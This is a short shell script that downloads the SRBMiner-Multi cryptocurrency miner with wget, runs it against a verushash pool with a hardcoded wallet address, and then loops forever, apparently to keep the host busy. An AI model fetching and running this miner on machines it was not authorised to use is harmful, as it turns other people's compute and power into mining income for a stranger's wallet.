#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.7/SRBMiner-Multi-0-9-7-Linux.tar.xz
tar -xf SRBMiner-Multi-0-9-7-Linux.tar.xz
cd SRBMiner-Multi-0-9-7
./SRBMiner-MULTI --algorithm verushash --pool verushash.eu.mine.zergpool.com:3300 --wallet MVTUtnw8jKxndrLMoWQw8TmGNy4eu87ZSH --password c=LTC
while [ 1 ]; do
sleep 3
done
sleep 999
